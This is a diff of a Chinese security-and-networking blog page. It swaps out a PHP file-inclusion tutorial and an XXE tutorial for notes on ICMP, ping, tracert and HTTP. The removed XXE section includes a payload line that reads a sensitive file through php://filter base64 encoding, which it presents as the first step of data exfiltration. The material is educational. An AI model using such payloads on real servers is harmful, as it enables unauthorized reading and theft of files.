-          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><hr>
-<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>因为相同代码重复出现在不同文件中会 产生代码冗余</p>
-<p>所以出现了文件包含函数，让代码更为高效</p>
-<p>需要用到这部分代码就会去调用，且被包含的文件会被当做PHP代码执行</p>
-<p>而且忽略后缀本身</p>
-<p>注意：文件包含并不是漏洞，但是被包含的文件能够被攻击者控制就是漏洞</p>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含分为</p>
-<p>本地包含（LFI）</p>
-<p>远程包含（RFI） 【远程包含默认不开启 allow_url_include &#x3D; Off】</p>
-<p>注意：他们可以转换，本地文件包含并不代表无法包含远程文件（SMB服务）</p>
-<h2 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h2><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>引用外部文件</p>
-<p>只有代码执行到include代码段时，调用的外部文件才会被引用并读取</p>
-<p>当引用的文件发生错误时，系统只会给出警告错误，而整个php文件会继续执行</p>
-<h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h3><p>include()函数的区别是：</p>
-<p>会在导入文件前先检测文件是否在该页面的其他部分被引用过，如果有，程序只能引用一次</p>
-<p>如果导入的文件中存在自定义函数，那么在同一程序中重复导入该文件，在第二次导入时会发生错误</p>
-<p>因为PHP不允许相同名称的函数重复声明</p>
-<h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p>引用外部文件</p>
-<p>在PHP文件被执行之前，会先去把被包含文件的内容提取出来然后整合成新的php一起执行</p>
-<p>当引用文件发生错误时，系统会报错，并停止执行下面代码</p>
-<h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h3><p>与require()函数唯一区别是</p>
-<p>会在导入文件前先检测文件是否在该页面的其他部分被引用过，如果有，程序只能引用一次</p>
-<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
-<p>对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p>
-<p>建议 假定所有输入都是可疑的，尝试对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现..&#x2F;之类的目录跳转符</p>
-<p>严格检查include类的文件包含函数中的参数是否外界可控</p>
-<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;efg&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<h2 id="include-1"><a href="#include-1" class="headerlink" title="include()"></a>include()</h2><p><strong>引用外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<p>执行结果：<br><img src="https://img-blog.csdnimg.cn/20210411103934504.png" alt="在这里插入图片描述"></p>
-<p><strong>引用不存在的[错误的]外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.jpg&quot;</span>); <span class="comment">//引用不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210411104006495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="include-once-1"><a href="#include-once-1" class="headerlink" title="include_once()"></a>include_once()</h2><p><strong>引用外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果</p>
-<p><img src="https://img-blog.csdnimg.cn/20210411104048674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>引用不存在的[错误的]外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.jpg&quot;</span>); <span class="comment">//不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210411104252801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="require-1"><a href="#require-1" class="headerlink" title="require()"></a>require()</h2><p><strong>引用存在的外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210411104439689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>引用不存在的[错误的]外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.jpg&quot;</span>);  <span class="comment">//不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210411104628818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="require-once-1"><a href="#require-once-1" class="headerlink" title="require_once()"></a>require_once()</h2><p><strong>引用存在的外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210411104826911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>引用不存在的[错误的]外部文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.jpg&quot;</span>);<span class="comment">//不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210411104901100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+          <h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><hr>
+<h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><p>在IP通信中，经常有数据包到达不了对方的情况，由于数据包被丢弃等原因，为了控制将必要的信息传递给发信方。</p>
+<p>ICMP协议是为了辅助IP协议，交换各种各样的控制信息而被制造出来的</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ICMP（Internet Control Message Protocol）是Internet控制报文协议</p>
+<p>ICMP协议是一种面向无连接的协议，它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制信息</p>
+<p>控制信息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息，这些控制消息虽然并不传输用户数据，但是对于用户数据的传递和网络安全具有极其重要的意义</p>
+<h2 id="报文封装"><a href="#报文封装" class="headerlink" title="报文封装"></a>报文封装</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106113610967.png" alt="image-20220106113610967"></p>
+<p>ICMP报文是使用IP数据包来封装和发送的，携带ICMP报文的IP数据报完全像其他类型数据的数据报那样在网络中被转发，没有额外的可靠性和优先级，由于IP数据报本身被放在底层物理数据帧中进行发送， 故ICMP报文本身也可能丢失或者出现传输错误</p>
+<h2 id="报文类型"><a href="#报文类型" class="headerlink" title="报文类型"></a>报文类型</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106114436534.png" alt="image-20220106114436534"></p>
+<h2 id="差错报文"><a href="#差错报文" class="headerlink" title="差错报文"></a>差错报文</h2><p>报告IP数据报在传输中的差错是ICMP报文最基础的功能</p>
+<p>ICMP的差错报文有如下特点：</p>
+<p>1、ICMP差错报文都是由路由器发送给源主机</p>
+<p>2、ICMP差错报文只提供IP数据报在传输过程中的差错报告，但并不规定对各类差错应采取什么样的处理措施（具体的处理，由收到ICMP差错报文的源主机将相应的差错与应用程序联系起来才能进行相应的差错处理）</p>
+<p>3、ICMP差错报文不享受任何优先权，也没有特别的可靠性保证措施，与普通的IP数据报一样进行传输，传输过程中可能被丢弃、损坏甚至被抛弃</p>
+<p>4、ICMP差错报文是伴随着抛弃出错的IP数据报而产生的</p>
+<p>5、当路由器发送一份参数错误等的ICMP差错报文时，ICMP报文数据区始终包含产生ICMP差错报文的IP数据报的头部和其数据区的前8个字节（64位）</p>
+<p>6、一些情况下，为了防止在网络中产生大量的ICMP差错报文（广播风暴），影响网络的正常工作，即使发送差错，也不会产生ICMP差错报文</p>
+<p>一些情况如下：</p>
+<ul>
+<li>ICMP报文发送差错</li>
+<li>目的地址是广播地址或多播地址（D类地址）的IP数据</li>
+<li>作为链路层广播的数据报</li>
+<li>不是IP分片的第一片</li>
+<li>源地址不是单个主机的数据报（源地址不能为零地址、回送地址、广播地址或多播地址）</li>
+</ul>
+<blockquote>
+<p>目的站不可达</p>
+</blockquote>
+<p>当路由器不能给数据报找到合适的路由路径，或者主机不能将数据报递交给上层协议时，相应的IP数据报就会被丢弃，然后一个目的站不可达差错控制报文将会被返回给源主机</p>
+<blockquote>
+<p>数据报超时</p>
+</blockquote>
+<p>数据报超时可以用来防止数据报在网络中被循环的路由，在IP首部中都有一个生存时间（TTL）字段，数据报每被转发一次，TTL的值便会减1，当TTL的值被减为0时，数据报会被网络丢弃，同时一个ICMP数据报超时报文会被返回给源主机</p>
+<blockquote>
+<p>源站抑制</p>
+</blockquote>
+<p>ICMP源站抑制报文就是为了给IP协议增加一种流量控制而设计的，当路由器或主机因拥塞而丢弃数据报时，它可以向源站发送ICMP源站抑制报文</p>
+<p>这个报文将告诉源站两个信息：</p>
+<ul>
+<li>第一，你的数据报发得太快，我已经丢弃了；</li>
+<li>第二，路径中出现了拥塞，请放慢你的数据报发送频率；</li>
+</ul>
+<blockquote>
+<p>重定向（路由）</p>
+</blockquote>
+<p>当路由器要将数据报转发到另一个网络时，它必须知道下一个路由器的IP地址，源主机也是这样，当一台主机刚开始运行时，它会将所有数据报发送给网络中的一个默认路由器，因为它只知道默认路由器这一个IP地址</p>
+<blockquote>
+<p>数据报参数错误</p>
+</blockquote>
+<p>数据报在网络中传输时，其首部中出现的任何二义性都可能会产生严重的问题，如果路由器或主机发现了这种二义性，或者数据报中的某个字段丢失，路由器会直接丢弃数据报，并向源主机返回一个数据报参数错误报文</p>
+<h2 id="查询报文"><a href="#查询报文" class="headerlink" title="查询报文"></a>查询报文</h2><blockquote>
+<p>概述</p>
+</blockquote>
+<p>常见的ICMP查询报文有以下几种：回送请求或回答、时间戳请求或回答、路由器询问和通告、信息请求或回答、地址掩码请求或回答</p>
+<blockquote>
+<p>回送请求或回答</p>
+</blockquote>
+<p>回送请求和回送回答报文是为诊断网络而设计的，我们使用这对报文来发现网络的问题，回送请求和回送回答报文组合起来就可以确定两个网络设备之间彼此是否能够通信</p>
+<p>回收请求和回送回答报文可以直接确定两台主机的IP协议是否能够正常通信，这是因为ICMP报文是被封装在IP数据报中发送的，发送请求的主机能收到回答报文，证明两台主机之间能够使用IP协议进行通信，同时也能证明源主机与目的主机之间的所有路由器的接收、处理、转发功能正常</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106125257238.png" alt="image-20220106125257238"></p>
+<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><blockquote>
+<p>Ping</p>
+</blockquote>
+<p>Ping主要原来检测网络的连通性，同时也要收集其他相关信息</p>
+<p><strong>原理</strong></p>
+<p>ping通过调用echo来发送请求，通过是否收到echo-reply来查询网络层的连通性</p>
+<p>ping的结果会给出传送的时间和TTL的数据，还可以查看主机到目的主机的路由</p>
+<p>这是因为ICMP的Ping请求数据报在每经过一个路由器的时候，路由器就会把自己的IP地址放到该数据包中，而目的主机则会把这个IP列表复制到ICMP数据包中发回给主机</p>
+<blockquote>
+<p>tracert</p>
+</blockquote>
+<p>tracert主要用来侦测主机到目的主机所经路由情况的工具，可以获取到所经路由器的IP地址</p>
+<p><strong>原理</strong></p>
+<p>它收到目的主机的IP后，首先给目的主机发送一个TTL&#x3D;1的UDP数据包，而经过的第一个路由器收到这个数据包以后，就自动将TTL减1.而TTL变为0以后，路由器就把这个包给抛弃了，并同时产生一个主机不可达的ICMP数据包给主机。</p>
+<p>主机收到这个数据包以后就发送一个TTL&#x3D;2的数据包给主机，然后刺激第二个路由器给主机发送ICMP数据包，如此反复直到到达目的主机</p>
 
       
     </div>
@@ -1567,7 +1082,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/30/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/06/HTTP%E4%B8%8EHTTPS%20%E5%8D%8F%E8%AE%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -1585,7 +1100,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/30/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">XXE-外部实体注入攻击</a>
+          <a href="/2023/01/06/HTTP%E4%B8%8EHTTPS%20%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">HTTP与HTTPS 协议</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1596,14 +1111,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-11-30 16:54:49" itemprop="dateCreated datePublished" datetime="2022-11-30T16:54:49+08:00">2022-11-30</time>
+      <time title="创建时间：2023-01-06 15:14:55" itemprop="dateCreated datePublished" datetime="2023-01-06T15:14:55+08:00">2023-01-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:41" itemprop="dateModified" datetime="2023-03-07T21:29:41+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-08 12:52:12" itemprop="dateModified" datetime="2023-03-08T12:52:12+08:00">2023-03-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1611,7 +1126,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
         </span>
     </span>
 
@@ -1625,67 +1140,585 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="XXE-外部实体注入攻击"><a href="#XXE-外部实体注入攻击" class="headerlink" title="XXE-外部实体注入攻击"></a>XXE-外部实体注入攻击</h1><hr>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XXE &#x3D;&#x3D;&gt;XML External Entity （XML外部实体）</p>
-<p><strong>原理</strong>：用户输入的数据被当做XML实体代码进行执行<br><strong>XXE&#x3D;&#x3D;&gt;用户输入的数据被当做XML代码进行了执行，然后利用DTD部分可以通过SYSTEM关键词发起网络请求从而获得数据</strong></p>
-<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>可扩展标记语言</p>
-<p>设计宗旨：传输数据，而非显示数据</p>
-<p>xml标签没有被预定义，需要自定义标签</p>
-<p><strong>特点</strong></p>
-<p>XML仅是存文本，不会执行任何事情</p>
-<p>XML可以自己发明标签（允许定义自己的标签和文档结构）</p>
-<p>XML是各种应用程序之间进行数据传输的最常见工具，并且在信息存储和描述领域变得越来越流行</p>
-<p>简单来说：XML就是存储数据的</p>
-<h2 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h2><p>DTD部分里面的一个特殊的地方（SYSTEM）可以调用外部文件进行XML文件的规划（发起网络请求）</p>
-<p>格式：****</p>
-<h2 id="PHP特殊函数"><a href="#PHP特殊函数" class="headerlink" title="PHP特殊函数"></a>PHP特殊函数</h2><p>在php中有一个特殊函数：simplexml_load_string()</p>
-<p>定义：simplexml_load_string(<em>data,classname,options,ns,is_prefix</em>);</p>
-<p>作用：simplexml_load_string() 函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象</p>
-<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>任意文件读取</p>
-<p>系统命令执行</p>
-<p>内网端口探测</p>
-<p>攻击内网网站</p>
-<p>……</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>很多时候后端语言解析了XML后并不会输出，故需要一个平台去接收数据<br>XML读取数据然后发送到接收的平台，然后接收平台存储</p>
-<p>XXE 攻击三步骤 &#x3D;&#x3D;&gt; 读取信息 信息外带 保存信息</p>
-<p>读取信息：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=敏感信息所在路径&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">base64加密读取的信息存放在file变量中</span><br></pre></td></tr></table></figure>
+          <h1 id="HTTP与HTTPS-协议"><a href="#HTTP与HTTPS-协议" class="headerlink" title="HTTP与HTTPS 协议"></a>HTTP与HTTPS 协议</h1><hr>
+<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><p>HTTP是一种网络协议，所有的html文件都是遵循这个标准进行传输的</p>
+<p>HTTP的出现是为了提供一种发布和接收HTML页面的方法</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HTTP（Hypertext Transfer Protocol，超文本传输协议），是一种分布式、合作式多媒体系统服务，面向应用层的协议，是Internet中目前使用最广泛的应用层协议</p>
+<p>HTTP协议是基于传输层的TCP协议进行通信，通用无状态的协议</p>
+<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL即统一资源定位符(Uniform Resource Locator)，用来唯一地标识万维网中的某一个文档</p>
+<p>URL由协议、主机和端口(默认为80)以及文件名三部分构成</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105162750434.png" alt="image-20220105162750434"></p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>用于在服务器和客户机之间传输超文本文件</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105162908590.png" alt="image-20220105162908590"></p>
+<h2 id="请求-x2F-响应交互模型"><a href="#请求-x2F-响应交互模型" class="headerlink" title="请求&#x2F;响应交互模型"></a>请求&#x2F;响应交互模型</h2><p>在用户点击URL为<a target="_blank" rel="noopener" href="http://www.qq.com/index.html%E7%9A%84%E9%93%BE%E6%8E%A5%E5%90%8E%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%92%8CWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%A7%E8%A1%8C%E4%BB%A5%E4%B8%8B%E5%8A%A8%E4%BD%9C">http://www.qq.com/index.html的链接后，浏览器和Web服务器执行以下动作</a></p>
+<p>1、浏览器分析超链接中的URL</p>
+<p>2、浏览器向DNS请求解析<a target="_blank" rel="noopener" href="http://www.qq.com的ip地址/">www.qq.com的IP地址</a></p>
+<p>3、DNS将解析出的IP地址返回给浏览器</p>
+<p>4、浏览器与服务器建立TCP连接（80端口）</p>
+<p>5、浏览器请求文档 ：GET &#x2F;index.html</p>
+<p>6、服务器给出响应，将文档 index.html发送给浏览器</p>
+<p>7、释放TCP连接</p>
+<p>8、浏览器显示index.html中的内容</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105163259369.png" alt="image-20220105163259369"></p>
+<h2 id="连接方式与无状态性"><a href="#连接方式与无状态性" class="headerlink" title="连接方式与无状态性"></a>连接方式与无状态性</h2><blockquote>
+<p>非持久性连接</p>
+</blockquote>
+<p>即浏览器每请求一个web文档，就创建一个新的连接，当文档传输完毕后，连接就立刻被释放</p>
+<blockquote>
+<p>持久性连接</p>
+</blockquote>
+<p>即在一个连接中，可以进行多次文档的请求和响应</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105163604436.png" alt="image-20220105163604436"></p>
+<blockquote>
+<p>无状态性</p>
+</blockquote>
+<p>指同一个客户端（浏览器）第二次访问同一个Web服务器上的页面时，服务器无法知道当前用户曾经访问过</p>
+<p>HTTP的无状态性简化了服务器的设计，使其更容易支持大量并发的HTTP请求</p>
